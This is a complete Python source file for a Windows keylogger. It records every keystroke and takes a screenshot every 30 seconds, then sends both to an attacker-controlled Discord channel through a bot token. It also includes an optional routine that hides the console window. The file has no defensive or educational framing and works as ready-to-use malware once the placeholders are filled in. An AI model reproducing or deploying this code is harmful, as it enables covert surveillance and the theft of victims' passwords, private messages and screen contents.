import requests
import logging
from pynput import keyboard
import win32api
import win32gui
import win32con
from PIL import ImageGrab
import time
import os
import threading
import tempfile

DISCORD_TOKEN = "YOUR BOT TOKEN"
CHANNEL_ID = "YOUR CHANNEL ID"

temp_dir = tempfile.gettempdir()
log_file = os.path.join(temp_dir, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

key_buffer = []
buffer_lock = threading.Lock()

def on_press(key):
    try:
        with buffer_lock:
            key_buffer.append(f'Key {key.char} pressed.')
    except AttributeError:
        with buffer_lock:
            key_buffer.append(f'Special key {key} pressed.')

def send_key_buffer():
    with buffer_lock:
        if key_buffer:
            message = "\n".join(key_buffer)
            send_to_discord(message)
            key_buffer.clear()

def send_to_discord(message):
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bot {DISCORD_TOKEN}"
    }
    data = {"content": message}
    try:
        requests.post(url, headers=headers, json=data, timeout=5)
    except Exception as e:
        logging.error(f"Error sending to Discord: {e}")

def capture_screen():
    screenshot = ImageGrab.grab()
    temp_dir = tempfile.gettempdir()
    screenshot_path = os.path.join(temp_dir, "screenshot.png")
    screenshot.save(screenshot_path)
    return screenshot_path

def send_screenshot():
    screenshot_path = capture_screen()
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}"
    }
    try:
        with open(screenshot_path, 'rb') as f:
            requests.post(url, headers=headers, files={'file': f}, timeout=10)
    except Exception as e:
        logging.error(f"Error sending screenshot: {e}")
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

def start_timer():
    while True:
        time.sleep(5)
        send_key_buffer()

def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def hide_console():
    try:
        window = win32api.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except Exception:
        pass

if __name__ == "__main__":
    # hide_console()  # Uncomment to hide the console window
    send_to_discord("Keylogger operational!")

    logging_thread = threading.Thread(target=start_logging, daemon=True)
    logging_thread.start()

    timer_thread = threading.Thread(target=start_timer, daemon=True)
    timer_thread.start()

    while True:
        send_screenshot()
        time.sleep(30)
